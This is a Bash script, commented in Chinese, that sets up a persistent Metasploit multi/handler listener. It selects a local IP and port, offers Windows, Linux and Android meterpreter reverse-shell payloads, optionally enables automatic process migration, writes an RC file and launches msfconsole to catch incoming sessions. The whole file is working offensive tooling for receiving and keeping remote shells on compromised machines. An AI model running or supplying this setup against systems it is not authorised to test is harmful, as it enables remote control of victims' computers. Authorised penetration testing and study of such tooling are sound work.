#!/bin/bash
# 增强版Metasploit持久化监听脚本 v1.2

# 清理函数
cleanup() {
    tput cnorm   # 恢复光标显示
    echo -e "\n\033[0m"  # 重置颜色
}

# 中断处理函数
handle_interrupt() {
    echo -e "\n\033[1;31m[!] 用户中断操作\033[0m"
    cleanup
    exit 1
}

# 注册中断和退出处理
trap handle_interrupt SIGINT
trap cleanup EXIT

# 检查root权限
if [[ $EUID -ne 0 ]]; then
    echo -e "\033[1;31m[!] 建议使用root权限运行本脚本 (使用 sudo)\033[0m"
    echo -e "\033[33m某些操作需要特权端口(1-1024)或特殊权限\033[0m"
    read -p $'\033[1;33m仍要继续吗? [y/N]: \033[0m' -r
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
    echo
fi

# 动态艺术字边框
term_width=$(tput cols)
border_line=$(printf '⣀%.0s' $(seq 1 $((term_width/2))))

echo -e "\033[1;34m$border_line\033[0m"
echo -e "\033[1;34m⣿\033[38;5;45m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;34m⣿\033[0m"
echo -e "\033[1;34m⣿\033[1;36m    ██╗     ██╗███████╗████████╗███████╗███╗   ██╗██╗   ██╗ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║███████╗   ██║   █████╗  ██╔██╗ ██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ██║     ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ███████╗██║███████║   ██║   ███████╗██║ ╚████║╚██████╔╝ \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[1;36m    ╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝  \033[1;34m⣿"
echo -e "\033[1;34m⣿\033[38;5;45m$(printf ' %.0s' $(seq 1 $((term_width-4))))\033[1;34m⣿\033[0m"
echo -e "\033[1;34m$border_line\033[0m"

# 数据库状态检查
check_db() {
    if ! msfdb status 2>&1 | grep -q 'running'; then
        echo -e "\033[1;33m[!] 检测到数据库未运行\033[0m"
        read -p $'\033[1;33m是否要初始化并启动数据库? [Y/n]: \033[0m' -r
        if [[ ! $REPLY =~ ^[Nn]$ ]]; then
            if ! msfdb init; then
                echo -e "\033[1;31m[!] 数据库初始化失败!\033[0m"
                exit 1
            fi
            if ! msfdb start; then
                echo -e "\033[1;31m[!] 数据库启动失败!\033[0m"
                exit 1
            fi
        fi
    fi
}

# IP选择增强
mapfile -t ips < <(ip -o -4 addr show scope global | awk '{gsub(/\/.*/,"");print $4}')

if [ ${#ips[@]} -eq 0 ]; then
    echo -e "\033[1;31m✖ 未检测到可用IP地址!\033[0m"
    exit 1
fi

echo -e "\n\033[1;33m可用IP地址列表:\033[0m"
for i in "${!ips[@]}"; do
    printf "\033[1;36m%2d) \033[1;32m%-15s\033[0m\n" $((i+1)) "${ips[i]}"
done

while :; do
    read -p $'\033[1;33m请选择IP (1-'${#ips[@]}$'): \033[0m' choice
    [[ $choice =~ ^[0-9]+$ ]] && ((choice >=1 && choice <=${#ips[@]})) && break
    echo -e "\033[1;31m无效输入! 请输入1-${#ips[@]}之间的数字\033[0m"
done
selected_ip=${ips[choice-1]}

# 端口验证增强
while :; do
    read -p $'\033[38;5;228m输入监听端口 [\033[1;33m默认 4444\033[0m\033[38;5;228m]: \033[0m' port
    port=${port:-4444}
    if [[ $port =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535)); then
        if [[ $port -le 1024 ]] && [[ $EUID -ne 0 ]]; then
            echo -e "\033[1;31m需要root权限才能使用特权端口(1-1024)!\033[0m"
            exit 1
        fi
        break
    else
        echo -e "\033[1;31m无效端口! 请输入1-65535之间的数字\033[0m"
    fi
done

# Payload选择增强
PS3=$'\033[38;5;228m请选择Payload类型: \033[0m'
options=("windows/meterpreter/reverse_tcp" 
         "windows/x64/meterpreter/reverse_tcp"
         "windows/meterpreter/reverse_https"
         "windows/x64/meterpreter/reverse_https"
         "linux/x86/meterpreter/reverse_tcp"
         "linux/x64/shell/reverse_tcp"
         "android/meterpreter/reverse_tcp"
         "自定义输入")
select opt in "${options[@]}"
do
  case $REPLY in
    [1-7])
      payload=$opt
      handler="exploit/multi/handler"
      break ;;
    8)
      while :; do
        read -p $'\033[38;5;228m输入自定义Payload: \033[0m' payload
        if [[ -n "$payload" ]]; then
          handler="exploit/multi/handler"
          break
        else
          echo -e "\033[1;31mPayload不能为空!\033[0m"
        fi
      done
      break ;;
    *) echo -e "\033[1;31m无效选项!\033[0m" ;;
  esac
done

# 自动迁移选项
auto_migrate=""
read -p $'\033[1;33m是否启用自动进程迁移? [Y/n]: \033[0m' -r
if [[ ! $REPLY =~ ^[Nn]$ ]]; then
    auto_migrate="set AutoRunScript post/windows/manage/migrate; "
    echo -e "\033[1;32m[+] 已启用自动进程迁移\033[0m"
else
    echo -e "\033[1;33m[-] 已禁用自动进程迁移\033[0m"
fi

# 构建RC文件
rc_file="/tmp/msf_$(date +%s).rc"
{
    echo "use $handler"
    echo "set PAYLOAD $payload"
    echo "set LHOST $selected_ip"
    echo "set LPORT $port"
    echo "set ExitOnSession false"
    [[ -n "$auto_migrate" ]] && echo "set AutoRunScript post/windows/manage/migrate"
    echo "exploit -j"
} > $rc_file

# 显示配置信息
echo -e "\n\033[1;36m[+] 持久化监听配置:\033[0m"
echo -e "\033[33mIP地址\t: \033[1;32m$selected_ip\033[0m"
echo -e "\033[33m端口号\t: \033[1;32m$port\033[0m"
echo -e "\033[33mPayload\t: \033[1;32m$payload\033[0m"
echo -e "\033[33m自动迁移\t: \033[1;32m$([[ -n "$auto_migrate" ]] && echo "启用" || echo "禁用")\033[0m"
echo -e "\033[33mRC文件\t: \033[1;32m$rc_file\033[0m"

# 执行选项
echo -e "\n\033[1;36m[操作选项]:\033[0m"
echo "1) 立即启动后台监听"
echo "2) 保存配置并退出"
echo "3) 直接进入msfconsole"
echo -e "\033[1;31m4) 退出\033[0m"

while :; do
    read -p $'\033[1;33m请选择操作 [1-4]: \033[0m' action
    case $action in
        1)
            check_db
            echo -e "\033[1;32m[+] 启动持久化监听器...\033[0m"
            echo -e "\033[33m使用 'sessions -l' 查看活动会话\033[0m"
            echo -e "\033[33m使用 'jobs -K' 停止所有监听器\033[0m"
            msfconsole -q -r "$rc_file"
            break
            ;;
        2)
            echo -e "\033[1;32m[+] 配置已保存至: $rc_file\033[0m"
            echo -e "\033[33m后续使用命令: msfconsole -r $rc_file\033[0m"
            break
            ;;
        3)
            check_db
            echo -e "\033[1;32m[+] 进入msfconsole...\033[0m"
            echo -e "\033[33m手动执行以下命令:\033[0m"
            echo -e "use $handler"
            echo -e "set PAYLOAD $payload"
            echo -e "set LHOST $selected_ip"
            echo -e "set LPORT $port"
            echo -e "set ExitOnSession false"
            [[ -n "$auto_migrate" ]] && echo -e "set AutoRunScript post/windows/manage/migrate"
            echo -e "exploit -j"
            msfconsole
            break
            ;;
        4)
            exit 0
            ;;
        *)
            echo -e "\033[1;31m无效选择!\033[0m"
            ;;
    esac
done

cleanup